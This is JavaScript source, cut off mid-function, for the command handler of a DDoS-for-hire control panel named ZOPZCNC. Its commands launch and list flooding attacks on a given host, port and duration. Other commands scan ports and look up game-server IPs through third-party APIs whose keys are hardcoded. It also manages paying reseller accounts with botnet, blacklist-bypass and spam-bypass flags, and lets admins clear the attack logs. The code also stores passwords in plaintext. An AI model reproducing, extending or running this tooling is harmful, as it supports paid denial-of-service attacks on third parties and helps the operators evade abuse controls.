const path = require('path');
const fs = require('fs');

if (typeof __dirname === 'undefined')
{
    global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/consoleUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/CheckHost.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/Base64.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './handlers/Firewallmanger.js'), 'utf8'));

const attacklogs = path.join(__dirname, './logs/attack_sent.log')
const methodsconfig = path.join(__dirname, './configs/methods.json')

function formatMethodsTable(methodsData) 
{
  const methodNames = Object.keys(methodsData);
  const rows = methodNames.map((name, index) => 
  {
    const method = methodsData[name];
    const vip = method.vip === undefined ? (method.VIP === undefined ? 'false' : method.VIP) : method.vip;
    const maxSlots = method.maxSlots === undefined ? (method['maxConcurrents'] === undefined ? '∞' : method['maxConcurrents']) : method.maxSlots;
    const apiOnly = method.apiOnly === undefined ? (method['apiOnly'] === undefined ? 'false' : method['apiOnly']) : method.apiOnly;
    const enabled = method.enabled === undefined ? 'false' : method.enabled;
    return { index: index + 1, name, vip: String(vip), maxSlots: String(maxSlots), apiOnly: String(apiOnly), enabled: String(enabled) };
  });

  const indexWidth = Math.max(...rows.map(r => String(r.index).length), 1);
  const nameWidth = Math.max(...rows.map(r => r.name.length), 'Method Name'.length);
  const vipWidth = Math.max(...rows.map(r => r.vip.length), 3);
  const maxSlotsWidth = Math.max(...rows.map(r => r.maxSlots.length), 9);
  const apiOnlyWidth = Math.max(...rows.map(r => r.apiOnly.length), 8);
  const enabledWidth = Math.max(...rows.map(r => r.enabled.length), 7);

  const header = 
    padRight('#', indexWidth) + '  ' +
    padRight('Method Name', nameWidth) + '  ' +
    padRight('VIP', vipWidth) + '  ' +
    padRight('Max Slots', maxSlotsWidth) + '  ' +
    padRight('API Only', apiOnlyWidth) + '  ' +
    padRight('Enabled', enabledWidth);

  const separator = 
    '-'.repeat(indexWidth) + '  ' +
    '-'.repeat(nameWidth) + '  ' +
    '-'.repeat(vipWidth) + '  ' +
    '-'.repeat(maxSlotsWidth) + '  ' +
    '-'.repeat(apiOnlyWidth) + '  ' +
    '-'.repeat(enabledWidth);

  const formattedRows = rows.map(r => 
    padRight(r.index, indexWidth) + '  ' +
    padRight(r.name, nameWidth) + '  ' +
    padRight(r.vip, vipWidth) + '  ' +
    padRight(r.maxSlots, maxSlotsWidth) + '  ' +
    padRight(r.apiOnly, apiOnlyWidth) + '  ' +
    padRight(r.enabled, enabledWidth));
  return [header, separator, ...formattedRows].join('\r\n');
}

function padRight(str, length) 
{
  str = String(str);
  if (str.length >= length) return str;
  return str + ' '.repeat(length - str.length);
}

async function HandleCommands(obj)
{
    const { command, params, client, stream, pageContents, user, attackHandler, db, config, activeSessions, pauseRef } = obj;
    if (command == 'credits')
    {
        globalThis.clearScreen(stream);
        stream.write(`[8;24;80t[38;5;39mZOPZCNC [97m– Version: [38;5;39mFinal Version\r\n`);
        stream.write('[97m────────────────────────────────────────────────────────────\r\n');
        stream.write('[97mA compact, powerful CNC built in just [38;5;39m1,639[97m lines of code.\r\n');
        stream.write('');
        stream.write('[97mSimple. Efficient. Effective.\r\n');
        stream.write('');
        stream.write('[97mLead Developer: [38;5;39m@zopz.\r\n');
        stream.write(`[97mConcept & Vision: [38;5;39m@zopz.[97m\r\n`);
        stream.write('');
        stream.write(`[97mInfo: [38;5;39mhttps://zopz-api.com/\r\n`);
        stream.write(`[97mPowered by: [38;5;39mZOPZ Services[97m (ZOPZ)\r\n`);
        stream.write('[97m────────────────────────────────────────────────────────────\r\n');
    }
    else if (pageContents[command])
    {
        let temp = pageContents[command];
        temp = globalThis.replaceplan(temp, user);
        temp = globalThis.sanitizeResellerLines(temp, user);
        temp = globalThis.sanitizeAdminLines(temp, user);
        stream.write(temp);
    }
    else if (attackHandler.methods[command]) 
    {
        const [host, port, time, len] = params;
        if (!host || !port || !time) 
        {
            stream.write('usage: <method> <host> <port> <time>\r\n');
            return;
        }
        const result = await attackHandler.processRequest(command, { host, port, time, len }, user);
        if (!result || result.error)
        {
            stream.write(`Error: ${(result && result.error) || 'Unknown error occurred'}\r\n`);
            if (!result) 
            {
                console.error(`process Request returned undefined for command: ${command}`);
            }
        } 
        else
        {
            let attacksent = pageContents.attacksent.replace(/{result.target.host}/g, result.target.host)
              .replace(/{result.target.port}/g, result.target.port)
              .replace(/{result.target.duration}/g, result.target.duration)
              .replace(/{result.target.time_sent}/g, result.target.time_sent)
              .replace(/{result.target.asn}/g, result.target.asn)
              .replace(/{result.target.org}/g, result.target.org)
              .replace(/{result.target.country_code}/g, result.target.country_code)
              .replace(/{command}/g, command);
            stream.write(attacksent);
            if (config.attack_logs) 
            {
              globalThis.logToFile(globalThis.LogPaths.AttacksSent, 'Sent attack', 
              {
                user: user.username,
                target: result.target.host,
                port: result.target.port,
                time: result.target.duration,
                method: result.target.method,
                datetime: result.target.time_sent
              });
            }
        }
    }
    else if (command === 'methodslist') 
    {
        console.log('Looking for methods config at:', methodsconfig);
        let methodsData;
        try 
        {
            const raw = fs.readFileSync(methodsconfig, 'utf8');
            methodsData = JSON.parse(raw);
        } 
        catch (e) 
        {
            stream.write('Error loading methods config.\r\n');
            return;
        }
        const output = formatMethodsTable(methodsData);
        stream.write(output + '\r\n');
    }
    else if (command === 'dc' || command === 'kick' && user.admin) 
    {
        const targetUser = params[0];
        const success = globalThis.disconnectUserByUsername(activeSessions, targetUser);
        if (success) 
        {
            stream.write(`\x1b[32mKicked user '${targetUser}'[97m\r\n`);
            globalThis.logToFile(globalThis.LogPaths.AdminDisconnects, 'Admin disconnected a user', 
            {
              admin: user.username,
              target: targetUser
            });
        } 
        else
        {
            stream.write(`\x1b[31mNo active session found for '${targetUser}'[97m\r\n`);
            globalThis.logToFile(globalThis.LogPaths.AdminDisconnects, 'Failed to disconnect user (not found)', 
            {
              admin: user.username,
              target: targetUser
            });
        }
        return;
    }
    else if (command === 'broadcast' && user.admin) 
    {
        const message = params.join(' ').trim();
        if (!message) 
        {
            stream.write(`\x1b[31mMessage can't be empty[97m\r\n`);
            return;
        }
        const count = globalThis.broadcastMessage(user.username, activeSessions, message);
        stream.write(`Broadcasted message to ${count} user(s)\r\n`);
        globalThis.logToFile(globalThis.LogPaths.BroadcastMessage, 'Admin broadcasted a message', 
        {
            admin: user.username,
            recipients: count,
            message
        });
    }
    else if (command === 'plan')
    {
      const rawText = pageContents['userplan'];
      if (!rawText) 
      {
        stream.write('Error: plan template not found.\r\n');
        return;
      }
      const latestUser = await db.findDocumentByKey('username', user.username, config.mongo_db_collection);
      if (!latestUser) 
      {
        stream.write('Error: user not found in database.\r\n');
        return;
      }
      globalThis.clearScreen(stream);
      let replacedText = globalThis.replaceplan(rawText, latestUser);
      replacedText = globalThis.replaceUsername(replacedText);
      replacedText = globalThis.sanitizeAdminLines(replacedText);
      stream.write(`${replacedText}\r\n`);
    }
    else if (command == 'clear') 
    {
        globalThis.clearScreen(stream);
        let temp = pageContents['home'];
        temp = globalThis.replaceUsername(temp, user);
        temp = globalThis.sanitizeAdminLines(temp, user);
        stream.write(temp);
    }
    else if (command === 'lookup' || command === 'tools' || command === 'tool')
    {
        const utils = pageContents.utils;
        if (utils) 
        {
            stream.write(`\r${utils}\r`);
        }
    }
    else if (command == 'passwd') 
    {
        const newpass = params[0];
        if (!newpass) 
        {
            stream.write('usage: passwd <newpass>\r\n');
            return;
        }
        await db.updateDocumentByKey('username', user.username, { password: newpass }, config.mongo_db_collection);
        stream.write(`\r\nUser Update Successful\r\n`);
        stream.write(`┌─ Username: ${user.username}\r\n`);
        stream.write(`└─ Updated: Password = ${newpass}\r\n`);
    }
    else if (command == 'firewall' && user.admin)
    {
        const tofRaw = params[0];
        const tof = ['true', '1', 'yes'].includes(tofRaw.toLowerCase());
        const fw = new globalThis.Firewallmanger();
        try
        {
            await fw.update(tof);
            stream.write(`\r\x1b[32m Firewall rules ${tof ? 'added' : 'removed'} successfully.[97m\r\n`);
        } 
        catch (err) 
        {
            stream.write(`\r\x1b[31mFirewall operation failed: ${err.message}[97m\r\n`);
        }
    }
    else if (command == 'admin' && user.admin) 
    {
        const adminText = pageContents.admin;
        if (adminText) 
        {
            stream.write(`${adminText}\r\n`);
        }
    } 
    else if (command === 'exit' || command === 'logout')
    {
        client.end();
    }
    else if (command === 'ongoing') 
    {
        const ongoingAttacks = Array.from(attackHandler.activeAttacks.values());
        if (!ongoingAttacks.length)
        {
            stream.write('No ongoing attacks\n\r');
            return;
        }
        const isAdmin = user.admin;
        const maxNum = Math.max(...ongoingAttacks.map((_, i) => (i + 1).toString().length), '#'.length);
        const maxUser = Math.max(...ongoingAttacks.map(r => r.username.length), 'User'.length);
        const maxMethod = Math.max(...ongoingAttacks.map(r => r.method.length), 'Method'.length);
        const maxHost = Math.max(...ongoingAttacks.map(r => r.params.host.length), 'Host'.length);
        const maxPort = Math.max(...ongoingAttacks.map(r => r.params.port.toString().length), 'Port'.length);
        const maxTime = Math.max(...ongoingAttacks.map(r => r.params.time.toString().length), 'Time'.length);
        const maxRemaining = Math.max(...ongoingAttacks.map(r =>
            Math.ceil((r.startTime + r.params.time * 1000 - Date.now()) / 1000).toString().length
        ), 'Remaining'.length);
        const totalWidth = maxNum + maxUser + maxMethod + maxHost + maxPort + maxTime + maxRemaining + 14;
        const header = `\x1b[97m#${' '.repeat(maxNum)}User${' '.repeat(maxUser - 4 + 2)}Method${' '.repeat(maxMethod - 6 + 2)}Host${' '.repeat(maxHost - 4 + 2)}Port${' '.repeat(maxPort - 4 + 2)}Time${' '             .repeat(maxTime - 4 + 2)}Remaining\n\r` +
                       `${'='.repeat(totalWidth)}[97m`;
        stream.write(`\r${header}\r\n`);
        const attackList = ongoingAttacks.map((r, index) => 
        {
            const num = (index + 1).toString().padEnd(maxNum + 1);
            const username = (isAdmin ? r.username : '****').padEnd(maxUser + 2);
            const method = r.method.padEnd(maxMethod + 2);
            const host = (isAdmin ? r.params.host : '****').padEnd(maxHost + 2);
            const port = r.params.port.toString().padEnd(maxPort + 2);
            const time = r.params.time.toString().padEnd(maxTime + 2);
            const remaining = Math.max(0, Math.ceil((r.startTime + r.params.time * 1000 - Date.now()) / 1000)).toString().padEnd(maxRemaining);
            return `\x1B[97m${num}${username}${method}${host}${port}${time}${remaining}[97m`;
        }).join('\n\r');
        stream.write(`\r${attackList}\r\n`);
    }
    else if (command == 'host') 
    {
        await fetch(`http://ip-api.com/json/${params[0]}`).then(response => response.json()).then(data => 
        {
            if (data.status === "success") 
            {
                stream.write(`\r\nHost Info:\r\n`);
                stream.write(`IP Address: ${params[0]}\r\n`);
                stream.write(`Country: ${data.country}\r\n`);
                stream.write(`Region: ${data.regionName} (${data.region})\r\n`);
                stream.write(`City: ${data.city}\r\n`);
                stream.write(`ISP: ${data.isp}\r\n`);
                stream.write(`Coordinates: Lat ${data.lat}, Lon ${data.lon}\r\n`);
            } 
            else 
            {
                stream.write('Failed to fetch host details\r\n');
            }
        }).catch(_ => 
        {
            stream.write('Error fetching host data\r\n');
        });
    }
    else if (command === 'tcp-ping')
    {
        const ch = new globalThis.CheckHost();
        const ip = params[0];
        const port = params[1] ? parseInt(params[1]) : 80;
        if (!ip)
        {
            stream.write('usage: tcp-ping <ip/host> [port]\r\n');
            return;
        }
        try
        {
            globalThis.resizeTerminal(stream);
            globalThis.clearScreen(stream);
            stream.write(`[>] Starting TCP Ping to ${ip}:${port}...\r\n`);
            const result = await ch.tcpPingHost(ip, port);
            stream.write(`TCP Ping completed for ${ip}:${port}:\r\n`);
            const logs = [];
            const originalWrite = process.stdout.write;
            process.stdout.write = (msg) => { logs.push(msg); };
            ch.logCheckHostResult('TCP Ping', result, 'tcp');
            process.stdout.write = originalWrite;
            stream.write(logs.join('').replace(/\n/g, '\r\n'));
        } 
        catch (err)
        {
            stream.write(`Error: ${err.message}\r\n`);
        }
    }
    else if (command === 'ping') 
    {
        const ch = new globalThis.CheckHost();
        const ip = params[0];
        if (!ip) 
        {
            stream.write('usage: ping <ip/host>\r\n');
            return;
        }
        try
        {
            globalThis.resizeTerminal(stream);
            globalThis.clearScreen(stream);
            stream.write(`[>] Starting Ping to ${ip}...\r\n`);
            const result = await ch.pingHost(ip);
            stream.write(`Ping completed for ${ip}:\r\n`);
            const logs = [];
            const originalWrite = process.stdout.write;
            process.stdout.write = (msg) => { logs.push(msg); };
            ch.logCheckHostResult('Ping', result, 'ping');
            process.stdout.write = originalWrite;
            stream.write(logs.join('').replace(/\n/g, '\r\n'));
        } 
        catch (err) 
        {
            stream.write(`Error: ${err.message}\r\n`);
        }    
    }
    else if (command == 'cfx')
    {
        try 
        {
            const cfxResponse = await fetch(`https://zopzsniff.xyz/api/server/${params[0]}?key=1293FEC15E625CF2CFFA4D3CA9563`);
            const data = await cfxResponse.json();
            if (data.serverData && data.serverData.Data) 
            {
                const serverData = data.serverData.Data;
                const connectEndPoint = serverData.connectEndPoints && serverData.connectEndPoints[0] ? serverData.connectEndPoints[0] : 'Unknown';
                const ipAddress = connectEndPoint.split(':')[0];
                const clients = serverData.clients || 0;
                const maxClients = serverData.sv_maxclients || 0;
                const hostname = serverData.hostname || 'Unknown';
                const gametype = serverData.gametype || 'Unknown';
    
                stream.write(`\r======================== \n\r`);
                stream.write(`\rServer Info\n`);
                stream.write(`\r======================== \n\r`);
                stream.write(`\rIP Address: ${connectEndPoint}\n\r`);
                stream.write(`\rGame Type: ${gametype}\n\r`);
                stream.write(`\rClients: ${clients}/${maxClients}\n\r`);
    
                if (data.geoInfo) 
                {
                    stream.write(`\r======================== \n\r`);
                    stream.write(`\rGeo Info\n`);
                    stream.write(`\r======================== \n\r`);
                    stream.write(`\rLocation: ${data.geoInfo.city}, ${data.geoInfo.region}, ${data.geoInfo.country}\n\r`);
                    stream.write(`\rCoordinates: Lat ${data.geoInfo.lat}, Lon ${data.geoInfo.lon}\n\r`);
                } 
                else 
                {
                    try 
                    {
                        const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=status,message,country,regionName,city,lat,lon`);
                        const geoData = await geoResponse.json();
                        if (geoData.status === 'success') 
                        {
                            stream.write(`\r======================== \n\r`);
                            stream.write(`\rGeo Info\n`);
                            stream.write(`\r======================== \n\r`);
                            stream.write(`\rLocation: ${geoData.city}, ${geoData.regionName}, ${geoData.country}\n\r`);
                            stream.write(`\rCoordinates: Lat ${geoData.lat}, Lon ${geoData.lon}\n\r`);
                        } 
                        else 
                        {
                            stream.write(`Location: Geo information unavailable (${geoData.message || 'Unknown error'})\n`);
                        }
                    } 
                    catch (geoError) 
                    {
                        stream.write(`Location: Geo information unavailable (Error: ${geoError.message})\n`);
                    }
                }
            } 
            else 
            {
                stream.write('Failed to fetch CFX server details\n');
            }
        } 
        catch (error) 
        {
            stream.write(`Error fetching CFX data: ${error.message}\n`);
        }
    }
    else if (command == 'portscan') {
    try {
        const ip = params[0];
        const portscanResponse = await fetch(`https://webresolver.nl/api.php?key=KC3B9-E9T5K-3TNS9-XDGC9&json&action=portscan&string=${ip}`);
        const portscanData = await portscanResponse.json();

        if (portscanData.ports) {
            stream.write(`\r======================== \n\r`);
            stream.write(`\rPort Scan Results\n`);
            stream.write(`\r======================== \n\r`);
            stream.write(`\rDomain/IP: ${portscanData.domain}\n\r`);
            stream.write(`\r======================== \n\r`);
            portscanData.ports.forEach((portInfo) => {
                const portStatus = portInfo.open === "true" ? "Open" : "Closed";
                stream.write(`Port ${portInfo.port} (${portInfo.service}): ${portStatus}\n\r`);
            });
        } else {
            stream.write('Failed to fetch port scan results\n');
        }
    } catch (error) {
        stream.write(`Error performing port scan: ${error.message}\n`);
    }
}

    else if (command == 'clearlogs' && user.admin)
    {
        globalThis.clearLogs();
        const logs_clear = pageContents.logs_clear;
        stream.write(`${logs_clear}\r\n`);
    }
    else if (command == 'reseller' && user.reseller) 
    {
        stream.write('\x1B[2J\x1B[H');
        const rawText = pageContents['reseller_info'];
        if (!rawText) 
        {
            stream.write('Error: template not found.\r\n');
            return;
        }
        const latestUser = await db.findDocumentByKey('username', user.username, config.mongo_db_collection);
        if (!latestUser) 
        {
            stream.write('Error: user not found in database.\r\n');
            return;
        }
        let replacedText = rawText
          .replace(/{username}/g, user.username)
          .replace(/{reseller.usersSold}/g, user.usersSold)
          .replace(/{reseller.earnings}/g, user.earnings)
          .replace(/{reseller.owed}/g, user.owed);
      
      stream.write(`${replacedText}\r\n`);
    }
    else if (command === 'adduser' && (user.admin || user.reseller)) 
    {
        if (pauseRef.value) return;
        const plans = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/plans.json')));
        pauseRef.value = true;

        stream.write('[97mAvailable Plans:[97m\r\n');
        for (const [id, plan] of Object.entries(plans)) 
        {
            if (typeof plan !== 'object') continue;
            const expiry = plan.Time === 'Lifetime' ? 'Lifetime' : `${plan.Time} days`;
            stream.write(
            `[97m[[38;5;39m${id}[97m][97m ` + 
            `[38;5;39m${plan.concurrents} [97mCons | ` +
            `[97mTime: [38;5;39m${plan.maxTime}[97ms | ` +
            `[38;5;39m$${plan.price}[97m | ` +
            `[97mExpiry: [38;5;39m${expiry}[97m\r\n`);
        }
        stream.write('\r');
  
        const questions = 
        [
            { key: 'username', text: 'Enter new username:', validate: val => val.length > 0 },
            { key: 'planType', text: 'Enter plan ID:', validate: val => !isNaN(parseInt(val)) },
            { key: 'admin', text: 'Admin? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'reseller', text: 'Reseller? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'botnet', text: 'Botnet access? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'homeholder', text: 'Home Holder access? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'api', text: 'API access? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'vip', text: 'VIP access? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'spambypass', text: 'Spam bypass? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'blacklistbypass', text: 'Blacklist bypass? (true/false):', validate: val => val === 'true' || val === 'false' },
            { key: 'cooldown', text: 'Cooldown (seconds):', validate: val => !isNaN(parseInt(val)) },
            { key: 'role', text: 'Role (default=user):', optional: true, validate: val => val === '' || typeof val === 'string' }
        ];

        const getUserInputs = () => 
        {
            return new Promise((resolve, reject) => 
            {
                let index = 0;
                let inputs = {};
                let buffer = '';
                let cursorIndex = 0;
                const lastDrawnLengthRef = { value: 0 };
                let promptLength = 0;

                const askQuestion = () => 
                {
                    if (index >= questions.length) 
                    {
                        stream.removeListener('data', listener);
                        stream.write('\r\n');
                        resolve(inputs);
                        return;
                    }
                    const q = questions[index];
                    const prefix = index === 0 ? '' : '\r\n';
                    buffer = '';
                    cursorIndex = 0;
                    lastDrawnLengthRef.value = 0;
                    promptLength = q.text.length + 1;
                    stream.write(`${prefix}\x1b[97m${q.text}[97m `);
                };

                const listener = (data) => 
                {
                    const raw = data.toString('utf-8');
                    if (raw === '\x03') 
                    {
                        stream.write('\r\nUser creation canceled.\r\n');
                        stream.removeListener('data', listener);
                        reject();
                        return;
                    }
                    if (raw === '\x1b[D') 
                    {
                        if (cursorIndex > 0) cursorIndex--;
                        redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
                        return;
                    }
                    if (raw === '\x1b[C') 
                    {
                        if (cursorIndex < buffer.length) cursorIndex++;
                        redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
                        return;
                    }
                    if (raw === '\x1b[A' || raw === '\x1b[B') return;
                    if (raw === '\x7f' || raw === '\b') 
                    {
                        if (cursorIndex > 0) 
                        {
                            buffer = buffer.slice(0, cursorIndex - 1) + buffer.slice(cursorIndex);
                            cursorIndex--;
                            redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
                        }
                        return;
                    }
                    if (raw === '\r' || raw === '\n') 
                    {
                        const inputLine = buffer.trim();
                        const q = questions[index];
                        if (!q.optional || inputLine !== '') 
                        {
                            if (q.validate && !q.validate(inputLine)) 
                            {
                                stream.write(`\r\nInvalid input for "${q.key}". Exiting.\r\n`);
                                stream.removeListener('data', listener);
                                reject();
                                return;
                            }
                            inputs[q.key] = inputLine;
                        }
                        index++;
                        askQuestion();
                        return;
                    }
                    buffer = buffer.slice(0, cursorIndex) + raw + buffer.slice(cursorIndex);
                    cursorIndex += raw.length;
                    redrawInline(stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef);
                };
                stream.on('data', listener);
                askQuestion();
            });
        };
        try 
        {
            const inputs = await getUserInputs();
            const 
            {
                username, planType, admin, reseller, botnet, homeholder, api, vip, spambypass,
                blacklistbypass, cooldown, role = 'user'
            } = inputs;
            const planId = parseInt(planType);
            if (!plans[planId]) 
            {
                stream.write('\x1b[91mInvalid plan type. Must be one of the following:[97m\r\n');
                for (const [id, plan] of Object.entries(plans)) 
                {
                    if (typeof plan !== 'object') continue;
                    const expiry = plan.Time === 'Lifetime' ? 'Lifetime' : `${plan.Time} days`;
                    stream.write(
                    `\x1b[93m[${id}][97m ` +
                    `${plan.concurrents} Cons | ` +
                    `Time: ${plan.maxTime}s | ` +
                    `\x1b[92m$${plan.price}[97m | ` +
                    `Expiry: ${expiry}\r\n`);
                }
                pauseRef.value = false;
                return;
            }

            if (await db.hasKey('username', username, config.mongo_db_collection)) 
            {
                stream.write('A user with that name already exists. Pick another.\r\n');
                pauseRef.value = false;
                return;
            }

            const parsedCooldown = parseInt(cooldown);
            if (isNaN(parsedCooldown)) 
            {
                stream.write('Invalid cooldown value. Must be a number.\r\n');
                pauseRef.value = false;
                return;
            }

            const plan = plans[planId];
            const tempPass = Math.random().toString(36).slice(-8);
            const expiryDate = globalThis.getTime(plan.Time);

            const newUser = 
            {
                username: username.toLowerCase(),
                password: tempPass,
                role: role || 'user',
                expiry: expiryDate,
                maxTime: plan.maxTime,
                concurrents: plan.concurrents,
                admin: admin === "true",
                reseller: reseller === "true",
                botnet: botnet === "true",
                homeholder: homeholder === "true",
                api: api === "true",
                vip: vip === "true",
                spambypass: spambypass === "true",
                blacklistbypass: blacklistbypass === "true",
                banned: false,
                cooldown: parsedCooldown,
                createdby: user.username,
            };

            if (user.reseller) 
            {
                const price = Number(plan.price);
                const ownerCut = Number(plans.owner_cut) / 100;
                if (isNaN(price) || isNaN(ownerCut)) 
                {
                    console.error(`Invalid plan data: price=${plan.price}, owner_cut=${plans.owner_cut}`);
                    stream.write('Internal error: Plan data is malformed.\r\n');
                    pauseRef.value = false;
                    return;
                }
                const platformOwed = Math.round(price * ownerCut);
                const resellerMade = price - platformOwed;
                user.owed += platformOwed;
                user.earnings = (user.earnings || 0) + resellerMade;
                user.usersSold = (user.usersSold || 0) + 1;
                await db.updateDocumentByKey('username', user.username, user, config.mongo_db_collection);
            }

            if (reseller === "true" && !user.reseller) 
            {
                newUser['earnings'] = 0;
                newUser['owed'] = 0;
                newUser['usersSold'] = 0;
            }

            globalThis.logToFile(globalThis.LogPaths.CreatedUsers, 'Created new user',
            {
                createdBy: user.username,
                newUser: newUser.username,
                maxTime: plan.maxTime,
                concurrents: plan.concurrents,
                expiryDate: expiryDate,
                role: newUser.role,
                admin: newUser.admin,
                reseller: newUser.reseller,
                vip: newUser.vip
            });

            await db.addDocument(newUser, config.mongo_db_collection);
            globalThis.clearScreen(stream);
            stream.write(`Username: ${username}\r\n`);
            stream.write(`Password: ${tempPass}\r\n`);
            stream.write(`Expiry: ${newUser.expiry}\r\n`);
            stream.write(`Cons: ${plan.concurrents}\r\n`);
            stream.write(`Time: ${plan.maxTime}s\r\n`);
        } 
        catch (error) 
        {
            console.error(error ?? "User creation canceled.");
        } 
        finally 
        {
            pauseRef.value = false;
        }
    }
    else if (command === 'editall' && user.admin) 
    {
        if (params.length < 2) 
        {
            stream.write('[38;5;39musage:[97m editall <type> <value>\r\n');
            stream.write('[38;5;39mTypes:[97m\r\n');
            stream.write('[38;5;39m┌─ expiry          [97m<MM/DD/YYYY | "forever">\r\n');
            stream.write('[38;5;39m├─ add_days        [97m<int> (adds days to expiry for all users)\r\n');
            stream.write('[38;5;39m├─ maxTime         [97m<int32>\r\n');
            stream.write('[38;5;39m├─ admin           [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ concurrents     [97m<int32>\r\n');
            stream.write('[38;5;39m├─ reseller        [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ botnet          [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ api             [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ vip             [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ spambypass      [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ blacklistbypass [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ homeholder      [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ banned          [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ cooldown        [97m<int32>\r\n');
            stream.write('[38;5;39m├─ owed            [97m<int32>\r\n');
            stream.write('[38;5;39m└─ role            [97m<string>\r\n');
            return;
        }
        const [type, value] = params;
        const collection = db.getCollection(config.mongo_db_collection);
        if (type === 'add_days') 
        {
            const daysToAdd = parseInt(value);
            if (isNaN(daysToAdd)) 
            {
                stream.write('\x1b[31mError:[97m Value must be an integer for add_days\r\n');
                return;
            }
            const allUsers = await collection.find({}).toArray();
            let updatedCount = 0;
            for (const u of allUsers) 
            {
                if (!u.expiry || u.expiry.toLowerCase() === 'forever') continue;
                let expiryDate = new Date(u.expiry);
                if (isNaN(expiryDate)) continue;
                expiryDate.setDate(expiryDate.getDate() + daysToAdd);
                const formattedDate = `${expiryDate.getMonth() + 1}/${expiryDate.getDate()}/${expiryDate.getFullYear()}`;
                await collection.updateOne({ username: u.username }, { $set: { expiry: formattedDate } });
                updatedCount++;
            }
            stream.write(`\x1b[32mUpdated expiry date for ${updatedCount} users by adding ${daysToAdd} days[97m\r\n`);
            return;
        }
        const update = {};
        if (['admin', 'homeholder', 'reseller', 'api', 'botnet', 'vip', 'spambypass', 'blacklistbypass', 'banned'].includes(type)) 
        {
            update[type] = value === 'true';
        } 
        else if (['cooldown', 'concurrents', 'maxTime', 'owed'].includes(type)) 
        {
            const intValue = parseInt(value);
            if (isNaN(intValue)) 
            {
                stream.write('\x1b[31mError:[97m Value must be an integer\r\n');
                return;
            }
            update[type] = intValue;
        } 
        else if (['role', 'expiry'].includes(type)) 
        {
            update[type] = value;
        } 
        else 
        {
            stream.write(`\x1b[31mError:[97m Unknown type '${type}'\r\n`);
            return;
        }
        const result = await collection.updateMany({}, { $set: update });
        globalThis.logToFile(globalThis.LogPaths.UserEdits, 'Edited all user accounts', 
        {
            editedBy: user.username,
            updatedField: type,
            newValue: update[type]
        });
        stream.write(`\x1b[32mUpdated ${result.modifiedCount} users: ${type} = ${update[type]}[97m\r\n`);
    }
    else if (command == 'edituser' && (user.admin || user.reseller)) 
    {
        if (params.length === 0) 
        {
            stream.write('[38;5;39musage:[97m edituser username <type> <value>\r\n');
            stream.write('[38;5;39mTypes:[97m\r\n');
            stream.write('[38;5;39m┌─ expiry          [97m<MM/DD/YYYY | "forever">\r\n');
            stream.write('[38;5;39m├─ maxTime         [97m<int32>\r\n');
            stream.write('[38;5;39m├─ concurrents     [97m<int32>\r\n');
            if (user.admin && user.reseller)
            {
               stream.write('[38;5;39m├─ owed            [97m<int32>\r\n');
               stream.write('[38;5;39m├─ reseller        [97m<true | false>\r\n');
            }
            stream.write('[38;5;39m├─ botnet          [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ api             [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ vip             [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ spambypass      [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ blacklistbypass [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ homeholder      [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ banned          [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ admin           [97m<true | false>\r\n');
            stream.write('[38;5;39m├─ cooldown        [97m<int32>\r\n');
            stream.write('[38;5;39m└─ role            [97m<string>\r\n');
            stream.write('[38;5;39m└─ password        [97m<string>\r\n');
            return;
        }
        const [username, type, value] = params;
        if (!username || !type || value === undefined) 
        {
            stream.write('\r\n\x1b[31mError:[97m Value must be an integer\r\n');
            return;
        }
        const update = {};
        if (['admin', 'homeholder', 'reseller', 'api', 'botnet', 'vip', 'spambypass', 'blacklistbypass', 'banned', 'botnet'].includes(type))
        {
            update[type] = value === 'true';
        } 
        else if (['cooldown', 'concurrents', 'maxTime', 'owed'].includes(type)) 
        {
            const intValue = parseInt(value);
            if (isNaN(intValue)) 
            {
                stream.write('Error: Value must be an integer\r\n');
                return;
            }
            update[type] = intValue;
        } 
        else if ( ['role', 'expiry'].includes(type)) 
        {
            update[type] = value;
        } 
        else if (type === 'password') 
        {
            if (value.length < 4) 
            {
                stream.write('Error: Password must be at least 4 characters long\r\n');
                return;
            }
            update[type] = value;
        }
        else 
        {
            stream.write(`\x1b[31mError:[97m Unknown type '${type}'\r\n`);
            return;
        }
        globalThis.logToFile(globalThis.LogPaths.UserEdits, 'Edited user account', 
        {
            editedBy: user.username,
            targetUser: username,
            updatedField: type,
            newValue: update[type]
        });
        await db.updateDocumentByKey('username', username, update, config.mongo_db_collection);
        stream.write(`\x1b[32mUser Update Successful[97m\r\n`);
        stream.write(`\x1b[36m┌─ Username[97m : ${username}\r\n`);
        stream.write(`\x1b[36m└─ Updated [97m : ${type} = ${update[type]}\r\n`);
    }
    else if (command == 'viewplan' && user.admin)  
    {
        const targetUsername = params[0];
